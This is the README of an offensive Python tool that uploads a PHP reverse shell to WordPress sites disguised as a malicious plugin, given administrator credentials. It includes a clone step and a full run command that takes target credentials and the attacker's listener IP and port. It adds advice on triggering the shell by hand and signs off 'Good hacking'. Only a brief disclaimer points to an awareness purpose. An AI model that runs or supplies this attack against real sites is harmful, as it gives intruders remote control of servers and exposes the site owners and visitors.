
<div align="center">

  <img src="https://github.com/Jsmoreira02/Pwn_wordpress/assets/103542430/6392fe40-bfff-4784-acfd-645ba2155574" height=130>
  
  <img src="https://img.shields.io/badge/Language%20-Python3-blue.svg" style="max-width: 100%;">
  <img src="https://img.shields.io/badge/Tool%20-Shell upload | reverse shell-brown.svg" style="max-width: 100%;">
  <img src="https://img.shields.io/badge/Target OS%20-Linux-yellow.svg" style="max-width: 100%;">
  <img src="https://img.shields.io/badge/Hacking tool%20-teste?style=flat-square" style="max-width: 100%;">  
  <img src="https://img.shields.io/badge/Type%20-Script-red.svg" style="max-width: 100%;">

</div>

# Evil Wordpress Plugin (Malicious)

Malicious, remotely performs an upload of a PHP reverse shell in the form of a plugin on a WordPress site. The exploit is only successful with user credentials, so make sure you know the target username and password and check if the target user has Administrator permissions.

Install by running:

```bash
  git clone https://github.com/Jsmoreira02/Malicious_Plugin.git
```
    
## Attacking the Target Website:

![ezgif com-video-to-gif(1)](https://github.com/Jsmoreira02/Pwn_Wordpress/assets/103542430/532470ab-161f-487d-a59b-f3d0d7366c25)


- **The speed depends on your connection, check the stability of your connection in case there is a slowdown in execution**


```bash 
python3 Malicious.py -t http://<IP or domain_name> -u <Target Username> -p <Target Password> -L <LOCAL IP> -P <LOCAL PORT>

```

### In case of complications or disconnection issues, you can just manually trigger the connection at the URL link. The script will pass it to you. ###

## 

- ***Good hacking :)***

# Warning:    
> I am not responsible for any illegal use or damage caused by this tool. It was written for fun, not evil and is intended to raise awareness about cybersecurity


